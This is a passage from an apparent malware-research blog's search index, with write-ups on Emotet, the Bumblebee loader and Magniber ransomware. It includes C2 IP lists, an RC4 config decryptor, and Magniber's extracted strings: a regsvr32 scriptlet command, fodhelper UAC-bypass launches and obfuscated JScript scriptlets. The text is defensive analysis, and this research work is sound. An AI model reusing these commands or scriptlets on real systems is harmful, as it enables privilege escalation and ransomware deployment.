209.97.163.214:443 0x7ffa3ba469d0: 46.55.222.11:443 0x7ffa3ba2dc28: 103.75.201.2:443 0x7ffa3ba26f38: 216.158.226.206:443 0x7ffa3ba45678: 134.122.66.193:8080 0x7ffa3ba24868: 1.234.21.73:7080 0x7ffa3ba35598: 167.99.115.35:8080 .",
            "url": "https://research.openanalysis.net/emotet/emulation/config/dumpulator/malware/2022/05/19/emotet_x64_emulation.html",
            "relUrl": "/emotet/emulation/config/dumpulator/malware/2022/05/19/emotet_x64_emulation.html",
            "date": " • May 19, 2022"
        }
        
    
  
    
        ,"post8": {
            "title": "Bumblebee Loader",
            "content": "Overview . According to Google&#39;s Threat Analysis Group... . The loader can be recognized by its use of a unique user-agent “bumblebee” which both variants share. The malware, hence dubbed BUMBLEBEE. . This loader has been observed downloading payloads such as cobalt strike and is often delivered itself via an ISO file. The sample we are strating with today is an ISO. . References . The chronicles of Bumblebee:The Hook, the Bee, and the Trickbot connection- Malpedia | Exposing initial access broker with ties to Conti | lnk file parser | . Sample . 0d740a348362171814cb314a48d763e336407904a36fa278eaf390c5743ec33b . . Triage . The ISO contains two files desk.dll and New Folder.Lnk. We can right click properties on the lnk file to take a look at its command. The lnk file is used to launch the dll with the following command. . C: Windows System32 rundll32.exe desk.dll,aCmHmjrptS . Unpacking . load rundll32.exe in x64dbg and change the command line to pass desk.dll,#1 | enable break on dll load | once desk.dll is loaded locate export we want to debug (aCmHmjrptS ord 1) and add a hardware breakpoint | remove the break on dll load and run until the export is bp is hit | we initially tried watching for allocated memory via VirutalAllocEx but didn&#39;t see anything interesting | instead we eneabled break on exit and just ran the dll | when the break on exit was hit we searched memory for the PE header DOS string and located a mapped PE | we unmapped the PE to reveal the payload | . Payload . Unpacked and unmapped payload abaa83ab368cbd3bbdaf7dd844251da61a571974de9fd27f5dbaed945b7c38f6 available on malshare. . Build Artifacts . There is a build artifact that may be useful for hunting other samples. . Z: hooker2 Common md5.cpp . We searched for this on VirusTotal using the search term https://www.virustotal.com/gui/search/content%253A%257B5a003a005c0068006f006f006b006500720032005c00%257D/files and found other sample but nothing too interesting. . Anti-Analysis . There are many anti-analysis checks some of which have been directly copied from the open source project al-khaser. To get some free work we compiled al-khaser and created and IDB using a build version with symbols. We when used bindiff to match the al-khaser IDB with the payload. This allowed us to import all of the symbols from al-khaser. . IDA Filtering . While using BinDiff we ran into some issues with the IDA filter not working correcte (we were trying to filter out std and internal functions). To get the filter to work correctly we needed use a specific order shown below. . Config . Instead of a config the payload contains a series of encrypted strings in the .data section. These strings include the campaign name and a C2 list. The encryption is RC4 and the key is a hard-coded plaintext string (also in the .data section). In our sample the key was BLACK. . Decrypted Config String . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . data = b&#39; x47 xCB xD6 x45 x96 xAD x39 x36 x82 x64 xA3 x68 xBB x80 x5C x8F x4F x86 x35 x73 xFD xE9 x2E x6D x8C x70 xB2 xE5 xEE xD3 xC6 x11 x60 xA2 x12 x6A x84 xC3 x52 x7A x3C x75 x3F x26 x60 x58 xF2 x4F x5E x74 xBE xA9 xAF xEE x84 xC7 x85 x54 x13 x63 xC1 x70 xBF x40 xE5 xC7 x8F xF0 xBE xB5 xF0 xBA x61 x7C x53 xF6 x4B xB9 x19 x7B xE1 xA0 xD9 xB4 x59 xC3 x37 x0B x31 x93 xC3 x16 x95 x64 x5F xE1 x5F xDD x62 x89 xAA x39 x08 x8C x8E xDC xC1 x94 xB8 x4C x3F x96 x97 x05 x06 xC4 xA4 xCA xB6 x7A x96 x3A x84 x2B xFD x9B x26 x9A x3C x8A x17 x3C xF9 x9C xCA x43 x36 xBC x4D x54 x7B x91 x0D x05 xC7 x0E x7A x6B x97 x36 xD2 xDD x53 x4D xB1 xDD xCB xCF xC6 xF6 x3A xC8 x02 xF2 xCF x6C x4D xF2 xD4 x35 xB6 x58 x73 x9D xBE x48 xA0 xF8 x9D x5D x87 xB6 x37 x71 x7E xD6 x46 x81 xCD xC3 xAE x18 xD7 xB5 x2F x90 x0D x87 x6F x8E x1C x47 xBA xD5 x86 xD3 xB4 x5C x47 x7F x03 x13 x17 x22 x87 x0C xD9 x66 x69 x32 x8F x98 xD2 xB2 x9F xB7 x68 xEA x50 xB8 x42 xB7 x61 x8C xB1 xC0 xDD x62 xA2 x53 x98 xE3 x02 xB2 xDD x82 x0A xE3 xB7 x7F xB9 xA7 xDB xD1 x43 xD5 x17 xBC xC0 x70 xF5 xCA x9D x56 xD9 xF6 xDC xBD xB9 xF0 x2B x7A xC9 x23 xA8 x71 xC6 xB3 x16 x74 x3F xB3 xFE xAF xE1 x2F x1E xCD x6F x22 x54 xB4 x18 xB0 xA8 x7E x34 xE3 x83 x43 x37 xB9 xB7 xA4 x39 x4A xE2 xFC xDB xE0 xF5 xDD xD6 x19 xAE x6C xBE x1E x1D x98 x17 xDF xA6 xB1 x2E xED xCA x03 x05 xBB x9F x5B x3B x8F x83 x48 x20 x33 x2E x50 xCE x2F x9E x7E xA5 xAE x86 x77 xFB x39 xB4 x35 x6D xBA xB8 xC9 x0A x82 x60 x80 x4C xA2 xBD x60 x2B x19 x9E x8D xBC xB2 x37 xCF xFD x6C xFB x54 x7A xD6 xB4 xA0 x07 x4F x6C xE4 x27 xFF xBA xE3 x5F x36 xA7 x41 xA9 x98 x88 x0F xDD xFB xA0 xF6 x93 xF6 x88 xED xCC xB2 x74 x73 x3B xCF x4A x79 x80 x6D xD3 x59 x27 x37 x73 x0D xBD x61 xE3 xDF x50 x33 x15 xAB x2A xAA x6E x8C x39 x25 x71 x78 xA5 x46 xB7 xB8 xE1 x16 xAD xE0 x24 x8D x91 xDD xA1 xC0 xE5 xE3 xB2 xB3 x62 x69 x82 x44 xE1 x64 x78 x0F x8A x75 x65 x46 x75 x89 x36 x8A x4A x43 xE0 x1B x02 x19 x71 x64 x8F x2F xD5 xF8 xA9 xAC x84 x37 x49 xDD x7D x24 x43 x17 xC1 xC1 x1F xD8 xD7 xD3 x07 xEF x22 x51 xB2 x75 x02 xF7 x10 x3F xC5 xFB x9F x5E x82 xA8 x23 xE9 x9A x17 x42 xFE x79 xC7 x69 x3E x6B x38 x05 x05 x2F x01 xED x50 xD7 x01 x18 x6B x38 x76 x2A x79 xDC x9F x12 x34 xE5 x26 x47 xBA x23 x73 xA1 xEB x82 x2A x3F xFD xD6 x90 xB6 x6B xD0 xB5 xEC xA4 x54 xBB xAD xBB xF2 xF0 x10 x42 xDA xAB x92 x75 x97 x27 xB7 x9D x7C xCF xCE xE2 x82 xB0 x49 x55 x87 x83 x69 x6F x90 xFF x4F x3F xF1 x6B x39 xE6 x45 xD9 x83 xBB xDE x0D xA0 x62 x0D x32 xD5 x24 x41 x8F x28 xCC xB4 x60 x95 x23 x1F x01 xD7 xB6 x08 x26 xC9 x02 x4B xFE xFF x20 xFF x2F xC7 xEB x00 x87 x10 x28 x24 x02 x92 xE4 xDA x2E x9D x4D xFC xB0 x96 xAD x00 x19 x72 x07 xEE x00 xD2 x4A x66 xAC xFB x06 xE4 x8E x62 x70 xA0 xDD x12 x64 x93 x67 x34 xBB xDF x0A x16 x6B xDE xC3 x1F x36 x47 x8B xC4 xCF x7B xAA x69 x1F x1C x61 x54 xE2 xA8 x17 xDA x4D xFA x42 x42 x3C xF7 x9A x4A xD3 x17 x2B xFC x8A x65 x73 x2F xBC x9F x34 x6D xBF x20 xFF x6A xF1 x75 x90 x1B x1E x04 x6A xC2 x2C x27 x81 xB6 x5A xC4 x16 xE7 xFD x2C xED xD0 x51 x52 x3A xEA x0A x9D xDB x4D xED x94 x63 x86 x32 x71 x02 x21 xF6 x1C xB5 x16 x06 xA5 xE5 x2A xAA xF7 x35 xA9 xED x4A x59 x1D x50 xDE xC7 xC4 x31 x6C x4D x3A x76 x13 xA5 xA9 xC6 xEA x14 x1E x7D x62 xC3 x32 xDA xFE x0C x5E x7E xA9 xB9 x12 x81 xA0 xDA xD8 xE7 x5C x0C x26 x1E x27 x22 xC6 x05 x0E xD2 x19 x60 xC7 x9E x27 x44 xAC xE4 xCD x8B x6E x1E x1B xD3 xED x7A xEF x6E x2C x8E x3A xFA x40 x59 x56 x10 xA7 xE3 x9E x9A x54 xC3 x29 xC9 xCA xCB xA2 x40 x96 xA6 x7A x0C xFD x21 x86 xEE x3C xFD x5D xB3 x97 x89 x06 x36 xEB x18 xF2 x39 x7F x60 xF7 x97 x03 x3A xBB x6B x81 x3A xE1 x70 x72 x33 x1C xF2 xA9 x74 xF2 x04 xC2 xB2 xD8 x54 x88 x8C xFA x6F xD6 x45 xAC xFB xC6 xB9 xD9 xE1 x59 x10 xD6 x7F x5F x12 x3A x8B x52 x8B x24 xEF x10 x8E x23 x13 xB5 x19 xA4 x4E x1E x6B xD3 x0B x5D x43 x98 x90 x88 xF8 x3B x56 x84 x31 xB1 xF7 x76 x57 x35 x25 x14 xF9 x26 x95 xC5 x4B xF0 xB8 xDF x27 x8C xB2 x11 x60 xBE x0D xC3 x7B x96 x95 x6D x0D x88 x3A x3E x18 xA3 xE4 xD4 x60 x89 x93 xAC x59 x6D x85 x78 xB6 x14 xF3 xD5 x05 x9F x40 x2F xD0 xAB xBE xC4 x09 x6D xAE x1E xE2 x6E x3E x99 x07 x98 xDD x03 x2D xC2 xDB x10 x35 x83 xB7 x27 x17 x71 xE6&#39; key = &#39;BLACK&#39; out = rc4crypt(data, key) print(out) . b&#39;142.11.222.79:443,23.254.224.200:443,103.175.16.52:443,199.195.252.30:443 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39; . data1 = &#39;47CED45EC69C1704B0568D5F82BA68BB7CAA0740D3DB1B59A24280D1C0E1F6215A962659A8F26249124408134E69C4616B46849D9BDDA8F6BC6D3D52F8459172D0F5A1C38E8FC48E527C53F64BB9197B&#39; out = rc4crypt(unhex(data1), key) print(out) . b&#39;1105a x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39; . data1 = &#39;42CBD06BA79C1704B0568D5F82BA68BB7CAA0740D3DB1B59A24280D1C0E1F6215A962659A8F26249124408134E69C4616B46849D9BDDA8F6BC6D3D52F8459172D0F5A1C38E8FC48E527C53F64BB9197B&#39; out = rc4crypt(unhex(data1), key) print(out) . b&#39;444 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39; .",
            "url": "https://research.openanalysis.net/bumblebee/malware/loader/unpacking/2022/05/12/bumblebee_loader.html",
            "relUrl": "/bumblebee/malware/loader/unpacking/2022/05/12/bumblebee_loader.html",
            "date": " • May 12, 2022"
        }
        
    
  
    
        ,"post9": {
            "title": "Magniber Ransomware Triage",
            "content": "Overview . We will be taking a look at Magniber ransomware. This ransomware is unique in that it uses syscalls instead of APIs and injects its main payload instead of unpacking to a nice PE. . . Sample . Magniber Packed (Malshare) | . References . Threat Analysis Report: PrintNightmare and Magniber Ransomware | What is a syscall | Extracting syscall numbers from ntdll (with code) | . Reversing Notes . Dumping . The sample injects its main payload into RWX memory but since it uses syscalls we can&#39;t use our x64dbg trick of monitoring memory writes to track the injected memory. Instead we just run the sample then use processhacker to suspend the process and inpsect the memory. . c: Windows System32 rundll32.exe magnibar.bin,#1 . We can see there are a lot of 4kB RWX segments but when we inspect them there is only a few bytes of code. However there is also a larger 52kB segment that contains what looks like code and some strings. We can dump this for further static analysis. . . Strings . The following strings are injected along with the payload. . regsvr32.exe scrobj.dll /s /u /n /i:../../../Users/Public/gxv495p91vs cmd /c &quot;start fodhelper.exe&quot; cmd /c &quot;start compmgmtlauncher.exe&quot; ?? 0123456789abcdef f0123456789 egoxsjzcj j BaseNamedObjects yv6493 Microsoft Enhanced RSA and AES Cryptographic Provider documents and settings appdata local settings sample music sample pictures sample videos tor browser recycle windows boot intel msocache perflogs program files programdata recovery system volume information winnt README.html . Payload Static Analysis . Once we open the dumped payload in IDA we can see that it relies on syscalls. . . In order to resolve these sycalls we need to create an enum mapping the syscall number to the API name. We can use our own sycall enum script for this task. Once we import the enum into IDA we can resolve the syscall numbers. . Since syscall numbers depend on the Windows build there is some logic in the malware that is used to check the KUSER_SHARED_DATA for the NtBuildNumber and NtMajorVersion. These manifest as refernces to memory at 0x7FFE0260 and 0x7FFE026C. IDA isn&#39;t able to resolve this and since our syscalls will be specific to windows version that we pulled our ntdll from we can artificailly set these values in IDA. . Edit-&gt;Segments-&gt;Creat segement... | Set the segment start address to 0x7FFE0260 and the length to atleast include 0x7FFE026C + 4 | Open Segments window and right click edit the new segment and change the Segment permissions to Read only | Edit the segment bytes to add the correct build number and major version number | . Once you have done this you can decompile the function and IDA will automatically remove all of the non-relevant syscalls. . Automatically Fixing KUSER SHARED Refs in IDA . This code is from Thomas . def fix_kuser_shared_data(): &quot;&quot;&quot; Find all calls to KUserSharedData, create a corresponding segment, load Windows 10 type library, and import the definition to the database &quot;&quot;&quot; address = 0x7FFE0000 # create the segment AddSeg(address, address, 0, 1, 0, scPub) set_segm_name(address, &#39;KUserSharedData&#39;) set_segm_attr(address, SEGATTR_PERM, SEGPERM_READ | SEGPERM_WRITE) set_segm_attr(address, SEGATTR_ALIGN, saRelPara) # load windows 10 type library add_til(&#39;ntddk_win10&#39;, ADDTIL_DEFAULT) # import the definition to the database import_type(None, -1, &#39;_KUSER_SHARED_DATA&#39;, IMPTYPE_LOCAL) create_struct(address, -1, &quot;_KUSER_SHARED_DATA&quot;) . Embeded Script . &lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;l06g2t&quot;&gt;&lt;script language=&quot;JScript&quot;&gt;&lt;![CDATA[var vk87t568 = new Array(111,106,114,108,104,32,46,112,79,105,118,101,99,83,87,97,110,116,82,113,119,65,100,109,47,115,98,68,117,88,120);for(var a7tvb=0;a7tvb&lt;31;a7tvb++) vk87t568[a7tvb] = String.fromCharCode(vk87t568[a7tvb]);var x9uvqw7 = new this[vk87t568[21]+vk87t568[12]+vk87t568[17]+vk87t568[9]+vk87t568[10]+vk87t568[11]+vk87t568[29]+vk87t568[8]+vk87t568[26]+vk87t568[1]+vk87t568[11]+vk87t568[12]+vk87t568[17]](vk87t568[14]+vk87t568[13]+vk87t568[12]+vk87t568[2]+vk87t568[9]+vk87t568[7]+vk87t568[17]+vk87t568[6]+vk87t568[13]+vk87t568[4]+vk87t568[11]+vk87t568[3]+vk87t568[3])[vk87t568[18]+vk87t568[28]+vk87t568[16]](vk87t568[10]+vk87t568[25]+vk87t568[25]+vk87t568[15]+vk87t568[22]+vk87t568[23]+vk87t568[9]+vk87t568[16]+vk87t568[6]+vk87t568[11]+vk87t568[30]+vk87t568[11]+vk87t568[5]+vk87t568[27]+vk87t568[11]+vk87t568[3]+vk87t568[11]+vk87t568[17]+vk87t568[11]+vk87t568[5]+vk87t568[13]+vk87t568[4]+vk87t568[15]+vk87t568[22]+vk87t568[0]+vk87t568[20]+vk87t568[25]+vk87t568[5]+vk87t568[24]+vk87t568[15]+vk87t568[3]+vk87t568[3]+vk87t568[5]+vk87t568[24]+vk87t568[19]+vk87t568[28]+vk87t568[9]+vk87t568[11]+vk87t568[17]);]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; &lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;r6ys81u&quot;&gt;&lt;script language=&quot;JScript&quot;&gt;&lt;![CDATA[var ch4me00 = new Array(71,53,102,97,114,67,48,111,50,58,65,69,119,79,68,103,90,104,83,75,113,112,117,85,108,120,82,45,100,80,109,88,78,47,46,32,89,105,118,98,51,72,101,106,92,121,99,110,87,115,116,84,95);for(var a7n5f=0;a7n5f&lt;53;a7n5f++) ch4me00[a7n5f] = String.fromCharCode(ch4me00[a7n5f]);var h873tlc494 = new this[ch4me00[10]+ch4me00[46]+ch4me00[50]+ch4me00[37]+ch4me00[38]+ch4me00[42]+ch4me00[31]+ch4me00[13]+ch4me00[39]+ch4me00[43]+ch4me00[42]+ch4me00[46]+ch4me00[50]](ch4me00[48]+ch4me00[18]+ch4me00[46]+ch4me00[4]+ch4me00[37]+ch4me00[21]+ch4me00[50]+ch4me00[34]+ch4me00[18]+ch4me00[17]+ch4me00[42]+ch4me00[24]+ch4me00[24])[ch4me00[26]+ch4me00[42]+ch4me00[15]+ch4me00[48]+ch4me00[4]+ch4me00[37]+ch4me00[50]+ch4me00[42]](ch4me00[41]+ch4me00[19]+ch4me00[11]+ch4me00[36]+ch4me00[52]+ch4me00[5]+ch4me00[23]+ch4me00[26]+ch4me00[26]+ch4me00[11]+ch4me00[32]+ch4me00[51]+ch4me00[52]+ch4me00[23]+ch4me00[18]+ch4me00[11]+ch4me00[26]+ch4me00[44]+ch4me00[18]+ch4me00[7]+ch4me00[2]+ch4me00[50]+ch4me00[12]+ch4me00[3]+ch4me00[4]+ch4me00[42]+ch4me00[44]+ch4me00[5]+ch4me00[24]+ch4me00[3]+ch4me00[49]+ch4me00[49]+ch4me00[42]+ch4me00[49]+ch4me00[44]+ch4me00[30]+ch4me00[49]+ch4me00[27]+ch4me00[49]+ch4me00[42]+ch4me00[50]+ch4me00[50]+ch4me00[37]+ch4me00[47]+ch4me00[15]+ch4me00[49]+ch4me00[44]+ch4me00[49]+ch4me00[17]+ch4me00[42]+ch4me00[24]+ch4me00[24]+ch4me00[44]+ch4me00[7]+ch4me00[21]+ch4me00[42]+ch4me00[47]+ch4me00[44]+ch4me00[46]+ch4me00[7]+ch4me00[30]+ch4me00[30]+ch4me00[3]+ch4me00[47]+ch4me00[28]+ch4me00[44],ch4me00[4]+ch4me00[42]+ch4me00[15]+ch4me00[49]+ch4me00[38]+ch4me00[4]+ch4me00[40]+ch4me00[8]+ch4me00[34]+ch4me00[42]+ch4me00[25]+ch4me00[42]+ch4me00[35]+ch4me00[49]+ch4me00[46]+ch4me00[4]+ch4me00[7]+ch4me00[39]+ch4me00[43]+ch4me00[34]+ch4me00[28]+ch4me00[24]+ch4me00[24]+ch4me00[35]+ch4me00[33]+ch4me00[49]+ch4me00[35]+ch4me00[33]+ch4me00[22]+ch4me00[35]+ch4me00[33]+ch4me00[47]+ch4me00[35]+ch4me00[33]+ch4me00[37]+ch4me00[9]+ch4me00[34]+ch4me00[34]+ch4me00[33]+ch4me00[34]+ch4me00[34]+ch4me00[33]+ch4me00[34]+ch4me00[34]+ch4me00[33]+ch4me00[23]+ch4me00[49]+ch4me00[42]+ch4me00[4]+ch4me00[49]+ch4me00[33]+ch4me00[29]+ch4me00[22]+ch4me00[39]+ch4me00[24]+ch4me00[37]+ch4me00[46]+ch4me00[33]+ch4me00[45]+ch4me00[20]+ch4me00[1]+ch4me00[45]+ch4me00[17]+ch4me00[6],ch4me00[26]+ch4me00[11]+ch4me00[0]+ch4me00[52]+ch4me00[18]+ch4me00[16]);var h873tlc494 = new this[ch4me00[10]+ch4me00[46]+ch4me00[50]+ch4me00[37]+ch4me00[38]+ch4me00[42]+ch4me00[31]+ch4me00[13]+ch4me00[39]+ch4me00[43]+ch4me00[42]+ch4me00[46]+ch4me00[50]](ch4me00[48]+ch4me00[18]+ch4me00[46]+ch4me00[4]+ch4me00[37]+ch4me00[21]+ch4me00[50]+ch4me00[34]+ch4me00[18]+ch4me00[17]+ch4me00[42]+ch4me00[24]+ch4me00[24])[ch4me00[26]+ch4me00[42]+ch4me00[15]+ch4me00[48]+ch4me00[4]+ch4me00[37]+ch4me00[50]+ch4me00[42]](ch4me00[41]+ch4me00[19]+ch4me00[11]+ch4me00[36]+ch4me00[52]+ch4me00[5]+ch4me00[23]+ch4me00[26]+ch4me00[26]+ch4me00[11]+ch4me00[32]+ch4me00[51]+ch4me00[52]+ch4me00[23]+ch4me00[18]+ch4me00[11]+ch4me00[26]+ch4me00[44]+ch4me00[18]+ch4me00[7]+ch4me00[2]+ch4me00[50]+ch4me00[12]+ch4me00[3]+ch4me00[4]+ch4me00[42]+ch4me00[44]+ch4me00[5]+ch4me00[24]+ch4me00[3]+ch4me00[49]+ch4me00[49]+ch4me00[42]+ch4me00[49]+ch4me00[44]+ch4me00[30]+ch4me00[49]+ch4me00[27]+ch4me00[49]+ch4me00[42]+ch4me00[50]+ch4me00[50]+ch4me00[37]+ch4me00[47]+ch4me00[15]+ch4me00[49]+ch4me00[44]+ch4me00[49]+ch4me00[17]+ch4me00[42]+ch4me00[24]+ch4me00[24]+ch4me00[44]+ch4me00[7]+ch4me00[21]+ch4me00[42]+ch4me00[47]+ch4me00[44]+ch4me00[46]+ch4me00[7]+ch4me00[30]+ch4me00[30]+ch4me00[3]+ch4me00[47]+ch4me00[28]+ch4me00[44]+ch4me00[14]+ch4me00[42]+ch4me00[24]+ch4me00[42]+ch4me00[15]+ch4me00[3]+ch4me00[50]+ch4me00[42]+ch4me00[11]+ch4me00[25]+ch4me00[42]+ch4me00[46]+ch4me00[22]+ch4me00[50]+ch4me00[42], &quot;&quot;, ch4me00[26]+ch4me00[11]+ch4me00[0]+ch4me00[52]+ch4me00[18]+ch4me00[16]);]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; &lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;zmqj1z18yx&quot;&gt;&lt;script language=&quot;JScript&quot;&gt;&lt;![CDATA[var g2701095 = new Array(120,67,108,121,113,103,111,92,87,51,47,95,118,83,104,106,58,69,72,84,99,97,78,90,100,80,110,65,115,48,102,109,82,46,105,85,98,116,75,114,32,50,89,53,88,71,112,79,119,101,117);for(var hqu0ua=0;hqu0ua&lt;51;hqu0ua++) g2701095[hqu0ua] = String.fromCharCode(g2701095[hqu0ua]);var gpf8p = new this[g2701095[27]+g2701095[20]+g2701095[37]+g2701095[34]+g2701095[12]+g2701095[49]+g2701095[44]+g2701095[47]+g2701095[36]+g2701095[15]+g2701095[49]+g2701095[20]+g2701095[37]](g2701095[8]+g2701095[13]+g2701095[20]+g2701095[39]+g2701095[34]+g2701095[46]+g2701095[37]+g2701095[33]+g2701095[13]+g2701095[14]+g2701095[49]+g2701095[2]+g2701095[2])[g2701095[32]+g2701095[49]+g2701095[5]+g2701095[8]+g2701095[39]+g2701095[34]+g2701095[37]+g2701095[49]](g2701095[18]+g2701095[38]+g2701095[17]+g2701095[42]+g2701095[11]+g2701095[1]+g2701095[35]+g2701095[32]+g2701095[32]+g2701095[17]+g2701095[22]+g2701095[19]+g2701095[11]+g2701095[35]+g2701095[13]+g2701095[17]+g2701095[32]+g2701095[7]+g2701095[13]+g2701095[6]+g2701095[30]+g2701095[37]+g2701095[48]+g2701095[21]+g2701095[39]+g2701095[49]+g2701095[7]+g2701095[1]+g2701095[2]+g2701095[21]+g2701095[28]+g2701095[28]+g2701095[49]+g27